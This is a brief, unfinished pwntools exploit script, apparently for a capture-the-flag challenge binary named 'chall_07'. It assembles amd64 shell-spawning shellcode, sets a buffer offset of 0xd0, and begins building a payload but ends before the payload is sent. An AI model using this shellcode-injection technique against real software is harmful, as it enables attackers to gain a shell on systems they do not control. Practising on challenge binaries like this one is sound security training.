from pwn import *


context.arch = "amd64"
p = process("./chall_07")

shellcode = asm(shellcraft.sh())

offset = 0xd0

p.sendline(b'trash')

payload = shellcode

